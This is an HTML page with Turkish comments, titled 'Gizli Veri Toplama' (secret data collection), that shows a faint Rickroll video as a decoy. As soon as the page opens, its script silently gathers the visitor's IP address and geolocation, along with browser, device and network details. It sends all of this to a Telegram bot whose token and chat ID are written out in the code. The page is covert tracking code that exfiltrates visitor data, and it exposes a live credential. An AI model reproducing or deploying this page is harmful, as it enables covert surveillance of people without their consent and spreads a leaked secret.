<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Gizli Veri Toplama</title>
  <style>
    /* Sayfa tamamen görünmez ama video gösterilecek */
    html, body {
      margin: 0; padding: 0; width: 100vw; height: 100vh; overflow: hidden;
      background: #000; /* siyah arka plan */
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #rickVideo {
      position: fixed;
      bottom: 10px;
      right: 10px;
      width: 200px;
      height: 112px; /* 16:9 oranı */
      opacity: 0.3;
      pointer-events: none; /* Videoya tıklanmasın */
      border-radius: 8px;
      box-shadow: 0 0 15px #00ff99;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <iframe
    id="rickVideo"
    src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ&controls=0&showinfo=0&rel=0"
    frameborder="0"
    allow="autoplay; encrypted-media"
    allowfullscreen
  ></iframe>

  <script>
    async function sendToTelegram(message) {
      const chatId = "6400737507"; // Senin chat ID'in
      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch(e) {
        // Hata varsa sessizce geç
      }
    }

    async function collectData() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const message =
          `Gizli Veri Toplama:\n` +
          `IP: ${data.ip}\n` +
          `Şehir: ${data.city}\n` +
          `Ülke: ${data.country_name}\n` +
          `Tarayıcı: ${navigator.userAgent}\n` +
          `Dil: ${navigator.language}\n` +
          `Çözünürlük: ${screen.width}x${screen.height}\n` +
          `Platform: ${navigator.platform}\n` +
          `Zaman Dilimi (UTC): ${-new Date().getTimezoneOffset() / 60}\n` +
          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
          `CPU Çekirdeği: ${navigator.hardwareConcurrency || 'Bilinmiyor'}\n` +
          `RAM (GB): ${navigator.deviceMemory || 'Bilinmiyor'}\n` +
          `Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n` +
          `İndirme Hızı: ${navigator.connection && navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'Bilinmiyor'}\n` +
          `Gecikme (RTT): ${navigator.connection && navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'Bilinmiyor'}\n` +
          `Veri Tasarrufu: ${navigator.connection && navigator.connection.saveData ? 'Açık' : 'Kapalı'}`;

        await sendToTelegram(message);
      } catch(e) {
        // Sessizce hatayı yoksay
      }
    }

    collectData();
  </script>
</body>
</html>
